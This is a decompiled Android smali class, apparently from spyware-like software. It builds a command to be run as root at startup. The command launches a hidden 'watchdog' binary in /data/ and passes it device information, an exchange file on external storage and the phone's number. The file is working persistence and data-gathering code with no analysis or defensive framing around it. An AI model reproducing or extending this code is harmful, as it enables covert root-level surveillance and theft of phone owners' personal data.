.class Lcom/fa/c/ExecuteAsRootOnStart$1;
.super Ljava/util/ArrayList;
.source "ExecuteAsRootOnStart.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/fa/c/ExecuteAsRootOnStart;->getCommandsToExecute()Ljava/util/ArrayList;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/util/ArrayList",
        "<",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lcom/fa/c/ExecuteAsRootOnStart;


# direct methods
.method constructor <init>(Lcom/fa/c/ExecuteAsRootOnStart;)V
    .locals 2

    .prologue
    .line 1
    iput-object p1, p0, Lcom/fa/c/ExecuteAsRootOnStart$1;->this$0:Lcom/fa/c/ExecuteAsRootOnStart;

    .line 19
    invoke-direct {p0}, Ljava/util/ArrayList;-><init>()V

    .line 21
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "/data/"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {p1}, Lcom/fa/c/ExecuteAsRootOnStart;->access$0(Lcom/fa/c/ExecuteAsRootOnStart;)Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/fa/c/Utilities;->GetWatchDogName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {p1}, Lcom/fa/c/ExecuteAsRootOnStart;->access$0(Lcom/fa/c/ExecuteAsRootOnStart;)Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/fa/c/Utilities;->GetDeviceInfoCommandLineArgs(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " /data/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {p1}, Lcom/fa/c/ExecuteAsRootOnStart;->access$0(Lcom/fa/c/ExecuteAsRootOnStart;)Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/fa/c/Utilities;->GetExecName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {p1}, Lcom/fa/c/ExecuteAsRootOnStart;->access$0(Lcom/fa/c/ExecuteAsRootOnStart;)Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/fa/c/Utilities;->GetExchangeFileName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {p1}, Lcom/fa/c/ExecuteAsRootOnStart;->access$0(Lcom/fa/c/ExecuteAsRootOnStart;)Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/fa/c/Utilities;->GetPhoneNumber(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/fa/c/ExecuteAsRootOnStart$1;->add(Ljava/lang/Object;)Z

    return-void
.end method
